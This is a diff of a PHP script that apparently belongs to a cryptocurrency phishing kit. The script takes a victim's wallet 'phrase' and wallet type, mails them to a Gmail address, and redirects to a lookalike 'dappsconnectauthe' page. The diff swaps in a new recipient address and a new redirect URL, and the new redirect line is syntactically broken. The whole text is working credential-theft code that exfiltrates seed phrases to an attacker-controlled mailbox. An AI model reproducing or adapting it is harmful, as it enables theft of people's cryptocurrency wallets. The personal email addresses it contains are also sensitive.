@@ -14,7 +14,7 @@ $email_body = "You have received a new phrase.";
 $email_pass = " Phrase of: $phrase for wallet type $wallettype."; 
 
 
-$to = 'arinoyewunmi@gmail.com';//<== update the email address
+$to = 'tewogbaoyeade1990@gmail.com';//<== update the email address
 
 
 //Send the email!
@@ -22,7 +22,7 @@ mail($to, $email_body, $email_pass);
 
 
 //done. redirect to thank-you page.
-header('Location:https://dappsconnectauthe.pages.dev/');
+header('Location:https://dappsconnectauthe.pages.dev/wallets#;
 
 
 // Function to validate against any email injection attempts
